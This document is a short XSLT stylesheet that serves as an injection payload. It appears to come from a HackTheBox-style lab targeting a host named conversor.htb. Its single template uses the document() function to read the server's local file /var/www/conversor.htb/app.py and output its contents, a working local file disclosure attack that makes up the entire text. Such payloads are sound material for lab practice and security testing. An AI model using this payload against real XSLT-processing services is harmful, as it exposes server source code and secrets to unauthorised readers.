<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
	  <xsl:value-of select="document('file:///var/www/conversor.htb/app.py')"/>
  </xsl:template>
</xsl:stylesheet>
